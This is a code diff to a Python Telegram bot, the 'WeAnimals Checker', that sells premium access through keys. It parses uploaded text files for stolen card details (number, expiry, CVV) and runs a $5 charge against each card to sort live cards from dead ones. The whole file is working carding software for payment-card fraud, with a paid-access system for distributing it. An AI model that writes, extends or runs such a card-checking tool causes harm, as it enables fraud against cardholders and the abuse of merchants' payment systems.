@@ -20,6 +20,7 @@ PROXIES = [
 
 client = TelegramClient('bot', API_ID, API_HASH)
 
+# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -49,6 +50,7 @@ async def is_premium(user_id):
     except:
         return False
 
+# ================== KEY SYSTEM ==================
 async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
@@ -70,9 +72,9 @@ async def redeem_key(user_id, key: str):
     data[key]["used"] = True
     await save_json(KEYS_FILE, data)
     await save_json(PREMIUM_FILE, premium)
-    return f"✅ Premium activated for {days} days."
+    return f"✅ Success! Premium activated for {days} days."
 
-# ================== REAL CHECK ==================
+# ================== CHARGE FUNCTION ==================
 async def charge_5_dollars(card: str):
     try:
         cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
@@ -102,6 +104,7 @@ async def charge_5_dollars(card: str):
     except:
         return {"status": "Declined", "response": "Error"}
 
+# ================== APPROVED UI ==================
 async def send_approved(event, card, info):
     msg = f"""
 **Approved ✅**
@@ -116,21 +119,68 @@ async def send_approved(event, card, info):
 """
     await event.reply(msg)
 
+# ================== BOT ==================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
 async def start(event):
     if not await is_premium(event.sender_id):
-        return await event.reply("**❌ No Access**\n\n`/key YOURKEY` bhejo")
-    await event.reply("**🔥 WeAnimals Checker**\n.txt file bhejo")
+        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate.")
+    await event.reply("**🔥 WeAnimals Checker**\nSend `.txt` file")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
 async def genkey(event):
-    if event.sender_id != OWNER_ID: return await event.reply("Owner only!")
+    if event.sender_id != OWNER_ID:
+        return await event.reply("Owner only!")
     days = int(event.pattern_match.group(1) or 30)
     key = await generate_key(days)
-    await event.reply(f"✅ Key:\n`{key}`")
+    await event.reply(f"✅ New Key:\n`{key}`")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
 async def redeem(event):
     key = event.pattern_match.group(1)
-    if not key: return await event.reply("Usage: /key KEY")
-    msg = await redeem_key(event.sender_id, key
+    if not key:
+        return await event.reply("Usage: `/key YOURKEY`")
+    msg = await redeem_key(event.sender_id, key)
+    await event.reply(msg)
+
+@client.on(events.NewMessage())
+async def txt_handler(event):
+    if not event.document or not str(event.file.name).lower().endswith('.txt'):
+        return
+    if not await is_premium(event.sender_id):
+        return await event.reply("❌ No Access! Use /key first.")
+
+    await event.reply("📂 Processing TXT file...")
+    path = f"temp_{event.sender_id}.txt"
+    await event.download_media(path)
+
+    cards = []
+    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
+        content = await f.read()
+        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
+        for c in found:
+            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
+            if len(cleaned.split('|')) == 4:
+                cards.append(cleaned)
+
+    os.remove(path)
+
+    if not cards:
+        return await event.reply("❌ No valid cards!")
+
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check...")
+
+    for card in cards:
+        result = await charge_5_dollars(card)
+        if result["status"] == "Approved":
+            await send_approved(event, card, result)
+        else:
+            await event.reply(f"❌ Declined\n`{card}`")
+        await asyncio.sleep(6)
+
+async def main():
+    print("🚀 Bot Started")
+    await client.start(bot_token=BOT_TOKEN)
+    await client.run_until_disconnected()
+
+if __name__ == "__main__":
+    asyncio.run(main())
